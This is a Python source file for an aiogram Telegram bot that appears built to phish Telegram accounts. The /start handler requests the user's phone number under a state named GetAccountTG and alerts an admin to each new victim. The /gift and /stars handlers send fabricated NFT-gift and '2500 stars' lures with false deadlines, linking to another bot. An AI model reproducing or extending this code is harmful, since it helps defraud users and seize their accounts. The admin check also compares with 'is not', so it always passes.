from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.dispatcher import FSMContext

from state import GetAccountTG
from loader import vip, bot
from data import start_msg, help_msg, User
from markup import phone_markup
from utils import config


@vip.message_handler(commands=['start'])
async def start_handler(msg: Message, state: FSMContext):
    # СБРОСЬ СОСТОЯНИЕ ПЕРЕД НОВЫМ СТАРТОМ
    current_state = await state.get_state()
    if current_state:
        await state.finish()
    
    if msg.from_user.id is not str(config("admin_id")):
        status = User().join_users(
            user_id=msg.from_user.id,
            username=msg.from_user.username
        )

        if status:
            await msg.answer(
                text=start_msg.format(full_name=msg.from_user.get_mention()),
                reply_markup=phone_markup()
            )
            await bot.send_message(
                chat_id=config('admin_id'),
                text=f'<b>Новый пользователь: {msg.from_user.get_mention()} | {msg.from_user.id}!</b>'
            )
            await GetAccountTG.one.set()
        else:
            await msg.answer(
                text=start_msg.format(full_name=msg.from_user.get_mention()),
                reply_markup=phone_markup()
            )
            await GetAccountTG.one.set()
    else:
        await msg.answer(
            text='<b>Рады вас видеть вас</b>'
        )


@vip.message_handler(commands=['help'])
async def help_handler(msg: Message):
    await msg.answer(
        text=help_msg
    )


@vip.message_handler(commands=['gift'])
async def gift_handler(msg: Message, state: FSMContext):
    # СБРОСЬ СОСТОЯНИЕ
    current_state = await state.get_state()
    if current_state:
        await state.finish()
        
    await msg.answer(
        text="""🎁 Вам дарят NFT: JesterHat #120172

Учтите, что подарок можно принять только с аккаунта, на который был отправлен данный подарок. Ссылка действительна 60 минут с момента получения.


Для принятия нажмите кнопку ниже.

https://t.me/nft/JesterHat-120172
""",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="Получить 🎁", 
                        url="https://t.me/lanoxstars_bot?start=gift"
                    )
                ]
            ]
        )
    )

@vip.message_handler(commands=['stars'])
async def ff_handler(msg: Message, state: FSMContext):
    # СБРОСЬ СОСТОЯНИЕ
    current_state = await state.get_state()
    if current_state:
        await state.finish()
        
    await msg.answer_photo(
        photo="https://i.postimg.cc/Xv9DyHTF/photo-2025-11-07-21-49-26.jpg",
        caption="""✨ ВАМ НАЧИСЛЕНО 2500 ЗВЁЗД!

🎉 Поздравляем! Вам был выдан специальный бонус - 2500 звёзд на ваш аккаунт.

⏰ Успейте забрать до истечения времени:
🕐 Чек действителен всего 25 минут!

Для зачисления звёзд на ваш счёт нажмите кнопку ниже 👇""",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="🚀 ЗАБРАТЬ 2500 ЗВЁЗД", 
                        url="https://t.me/lanoxstars_bot?start=gift"
                    )
                ]
            ]
        )
    )